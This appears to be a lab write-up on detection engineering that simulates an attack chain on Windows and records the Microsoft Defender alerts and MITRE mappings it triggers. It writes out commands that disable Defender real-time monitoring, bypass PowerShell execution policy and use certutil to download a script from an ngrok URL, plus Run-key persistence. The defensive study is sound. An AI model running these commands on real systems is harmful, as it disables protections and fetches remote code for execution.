# 🛡️ Detection Engineering Case Study  
## Behavioral Correlation: LOLBins, Persistence & Ransomware Heuristics

---

# 📌 Executive Summary

This case study documents a controlled adversary behavior simulation conducted in a lab environment monitored by Microsoft Defender for Endpoint (MDE).

The goal was **not to evade detection**, but to:

- Intentionally generate realistic attack telemetry
- Observe Defender behavioral detections
- Analyze process trees and log artifacts
- Map activity to MITRE ATT&CK
- Understand behavioral correlation logic

Multiple alerts were triggered, including:

- Living-off-the-Land Binary (LOLBIN) usage
- Behavioral ransomware heuristic (T1486)

No encryption or destructive payloads were deployed.

---

# 🧠 Phase 1 – Planning & Simulation Design

## 🎯 Objective

Simulate a realistic attacker chain to study:

- Process spawning behavior
- Registry modification logs
- PowerShell telemetry
- Network activity
- EDR behavioral correlation

---

## 📋 Planned Attack Chain (High-Level)

1. Modify security configuration (defense impairment)
2. Execute PowerShell script
3. Download file using native Windows utility
4. Create hidden directory
5. Establish persistence via Run key
6. Trigger additional system activity to observe correlation

---

## 🧰 Tools Used (Lab Only)

- Windows VM
- PowerShell
- Native Windows utilities
- Microsoft Defender for Endpoint
- Advanced Hunting (KQL)
- Kali Linux: red team tools

---

## ⚠️ Adversary Simulation Steps

1. On Attacker machine I created a file with a script inside that creates a hidden directory with a "reverse shell" script (just opens calculator app). It also creates persistence with registry keys that runs on logon.

<img width="750" height="438" alt="image" src="https://github.com/user-attachments/assets/1971e217-14ac-4715-a092-b21b70c70093" />

2. I created a python http server and proxied the connection through ngrok, to create a temporary URL from which I can pull the created file onto the victim machine.
3. On the victim machine I disabled real time monitoring and bypassed execution policy with: `Set-MpPreference -DisableRealtimeMonitoring $true` and `Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass`
4. The previous command allowed certutil to download files from the attacker machine and run the downloaded file.
Command used: `certutil -urlcache -split -f https://fisher-promarriage-untremendously.ngrok-free.dev/maint.ps1 maint.ps1`
<img width="650" height="186" alt="image" src="https://github.com/user-attachments/assets/3256cdf0-ce4c-4ad2-af2a-8ca2910c91ea" />

5. After executing the downloaded file, a new file was ready to be executed which could lead to a reverse shell, but I decided to let it just execute calculator.exe
<img width="650" height="918" alt="image" src="https://github.com/user-attachments/assets/d0ca2bac-2888-4499-88fb-ada1aa6f0c84" />




---

# 🔴 Phase 2 – Adversary Simulation (Behavioral)

## 1️⃣ Defense Impairment

**MITRE:** T1562.001 – Disable or Modify Security Tools

> 📷 Insert command screenshot here  
> 📷 Insert Defender log screenshot here  

---

## 2️⃣ Script Execution

**MITRE:** T1059.001 – PowerShell

Observed:

- Execution policy modification
- Script execution from user directory
- Child process spawning

> 📷 Insert PowerShell execution log  
> 📷 Insert DeviceProcessEvents screenshot  

---

## 3️⃣ Ingress Tool Transfer (LOLBIN)

**MITRE:** T1105 – Ingress Tool Transfer

Native Windows utility used to retrieve remote script.

Resulted in:

- Network event log
- Process creation event
- Living-off-the-Land alert

> 📷 Insert LOLBin alert screenshot  
> 📷 Insert process tree screenshot  

---

## 4️⃣ Hidden Directory Creation

Directory created with:

- Hidden attribute
- System attribute

Observed telemetry:

- File creation events
- Directory attribute modification

> 📷 Insert file event logs  

---

## 5️⃣ Persistence via Registry Run Key

**MITRE:** T1547.001 – Registry Run Keys / Startup Folder

Registry path modified: `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`


Observed:

- Registry modification event
- PowerShell command reference in value

> 📷 Insert DeviceRegistryEvents screenshot  

---

# 🚨 Phase 3 – Defender Alerts Triggered

## Alert 1 – Living-off-the-Land Binary Usage

Description:

> Use of native Windows utility to execute or retrieve potentially malicious content.

Triggered by:

- Process chain behavior
- Network activity
- Correlation with prior defense impairment

---

## Alert 2 – Ransomware Behavior Heuristic

**MITRE:** T1486 – Data Encrypted for Impact

Alert indicated:

- Rapid file modifications by SearchApp.exe
- Behavioral ransomware classification

Important finding:

No encryption occurred.

This was a behavioral correlation trigger.

> 📷 Insert ransomware alert screenshot  

---

# 🔎 Phase 4 – Blue Team Investigation

## 📊 Process Tree Analysis
userinit.exe
└── explorer.exe
└── powershell.exe
└── <native utility>


Observations:

- Legitimate signed binaries
- Suspicious command-line parameters
- Clear parent-child relationship

> 📷 Insert process graph screenshot  

---

## 📁 File System Telemetry

Observed:

- Hidden directory creation
- Script file creation
- Cache file modification burst

Example query:

```kql
DeviceFileEvents
| where InitiatingProcessFileName == "<process>"



# 🧠 Behavioral Correlation Analysis

Defender likely correlated:

Defense impairment

Script execution

LOLBin usage

Registry persistence

Burst file modification activity

This behavior chain resembles ransomware pre-encryption stages.



# 🔬 Telemetry Comparison: Download Methods


# ⚠️ Disclaimer

This lab was conducted in a controlled environment for defensive research and detection engineering education.

No destructive payloads were executed.
